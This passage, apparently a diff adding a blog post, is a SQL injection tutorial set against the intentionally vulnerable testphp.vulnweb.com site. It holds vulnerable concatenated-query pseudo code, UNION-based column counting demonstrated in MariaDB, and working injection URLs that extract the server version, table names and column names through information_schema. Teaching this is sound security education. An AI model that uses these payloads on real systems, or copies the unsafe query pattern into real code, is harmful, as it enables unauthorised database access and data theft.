+After observing the behavior of the test.php.vulnweb, this pseudo code seems appropriate.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SELECT (some unknown column names) FROM listproducts WHERE cat=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;img&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;author&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h3 id=&quot;finding-the-column-count&quot;&gt;Finding the column count&lt;/h3&gt;
+
+&lt;p&gt;As we talked before, after finding the vulnerability with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2-1&lt;/code&gt;, it is crucial to run our own queries.&lt;br /&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UNION&lt;/code&gt; will be starting point for this example. However we need to
+know how many columns there are.&lt;br /&gt;The way to do that is enumerate: &lt;br /&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1 UNION SELECT 1&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1 UNION SELECT 1....x&lt;/code&gt;.
+&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/fundamentals-of-sql-injection/sql10.jpg&quot; alt=&quot;Desktop View&quot; /&gt;
+&lt;br /&gt;
+As you can see, when the number of columns are not match, this happens.
+&lt;br /&gt;&lt;br /&gt;To give you better understanding about this
+I will demonstrate this on my local machine with a test table.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;n&quot;&gt;MariaDB&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;----------+----------+-----------+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PersonID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LastName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FirstName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;----------+----------+-----------+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;        &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Baris&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Burak&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;        &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Baris&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Burak&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;        &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Baris&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Burak&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;        &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Baris&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Burak&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;        &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Baris2&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Burak2&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;        &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Baris3&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Burak3&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;----------+----------+-----------+&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;MariaDB&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PErsonID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;----------+----------+-----------+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PersonID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LastName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FirstName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;----------+----------+-----------+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;        &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Baris3&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Burak3&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;----------+----------+-----------+&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;MariaDB&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PErsonID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;UNION&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1222&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;The&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;used&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;statements&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;have&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;different&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;number&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;columns&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;MariaDB&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PErsonID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;UNION&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1222&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;The&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;used&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;statements&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;have&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;different&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;number&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;columns&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;MariaDB&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PErsonID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;UNION&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;----------+----------+-----------+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PersonID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LastName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FirstName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;----------+----------+-----------+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;        &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Baris3&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Burak3&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;        &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;----------+----------+-----------+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;There are three columns for this table, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Person ID&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LastName&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FirstName&lt;/code&gt;.It means the second query I will run after &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UNION&lt;/code&gt; should also
+have three columns to create an appropriate table. It actually makes sense, because it would be weird to have a concatanated table 
+with a blank column.
+As you can see I am getting the same error as the error on website when the number of columns are not match.
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/fundamentals-of-sql-injection/sql9.jpg&quot; alt=&quot;Desktop View&quot; /&gt;
+&lt;br /&gt;
+After enumerating until 11, we finally returning to our referance point.Thus we can tell the table has 11 columns in total.
+Scroll down to the bottom, you should see someting different.
+&lt;br /&gt;
+&lt;a href=&quot;http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,,8,9,10,11&quot;&gt;http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,,8,9,10,11&lt;/a&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/fundamentals-of-sql-injection/sql8.jpg&quot; alt=&quot;Desktop View&quot; /&gt;
+&lt;br /&gt;
+There is one more entry right now. However we see 7, 2 and 9. It means that web application prints out the informations to the
+html document that contained in second, seventh and nineth columns in the table.&lt;br /&gt;
+It means that we can run whatever we want in that areas to extract information from the database. For example lets run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;version()&lt;/code&gt;
+helper function at second, seventh or nienth column to see version of the server that running the database.
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;a href=&quot;http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,version(),3,4,5,6,7,8,9,10,11&quot;&gt;http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,version(),3,4,5,6,7,8,9,10,11&lt;/a&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/fundamentals-of-sql-injection/sql11.jpg&quot; alt=&quot;Desktop View&quot; /&gt;
+&lt;br /&gt;
+After this point of time, all the helper functions are available for you.You can run the following to avoid first part of the
+sql query to only see your own query by selecting something non existent from the database.
+&lt;br /&gt;
+&lt;a href=&quot;http://testphp.vulnweb.com/listproducts.php?cat=8217582175821%20UNION%20SELECT%201,version(),3,4,5,6,7,8,9,10,11&quot;&gt;http://testphp.vulnweb.com/listproducts.php?cat=8217582175821%20UNION%20SELECT%201,version(),3,4,5,6,7,8,9,10,11&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&quot;extracting-the-table-names&quot;&gt;Extracting the table names&lt;/h3&gt;
+&lt;p&gt;First thing to do is to gather all the table names exists in the database.For MySQl it is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;information_schema&lt;/code&gt; which provides
+access to database metadata.We are going to use methods of that information_schema to enumerate the database. 
+Even though helper function’s syntax or names will vary database to database, there is always a functionality doing
+the same thing with for different database.
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;n&quot;&gt;MariaDB&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;testdb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;table_name&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tables&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;table_schema&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;database&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;------------+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;table_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;------------+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;------------+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;With &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tables&lt;/code&gt; method belongs to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;information_schema&lt;/code&gt;, we can query the table names.&lt;br /&gt;
+Now lets imply this method to the acuart database.
+&lt;br /&gt;
+&lt;a href=&quot;http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,table_name,8,9,10,11 FROM information_schema.tables WHERE table_schema=database()&quot;&gt;http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,table_name,8,9,10,11 FROM information_schema.tables WHERE table_schema=database()&lt;/a&gt;
+&lt;img src=&quot;/assets/img/posts/fundamentals-of-sql-injection/sql12.jpg&quot; alt=&quot;Desktop View&quot; /&gt;
+&lt;br /&gt;
+Awesome, we got all the table names storing in the acurat db.&lt;/p&gt;
+&lt;h3 id=&quot;extracting-the-column-names&quot;&gt;Extracting the column names&lt;/h3&gt;
+&lt;p&gt;Just like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tables&lt;/code&gt;, there is also &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;columns&lt;/code&gt; method belongs to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;information_schema&lt;/code&gt;.However, to use that target-spesific, first
+we needed to see table names. Otherwise it will bring all the columns exists in the database, such a mess.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;n&quot;&gt;MariaDB&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;testdb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;column_name&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;columns&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;table_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;users&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;---------------------+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;column_name&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;---------------------+&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PersonID&lt;/span&gt;            &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LastName&lt;/span&gt;            &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FirstName&lt;/span&gt;           &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PersonID&lt;/span&gt;            &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FirstName&lt;/span&gt;           &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LastName&lt;/span&gt;            &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;USER&lt;/span&gt;                &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CURRENT_CONNECTIONS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TOTAL_CONNECTIONS&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;---------------------+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
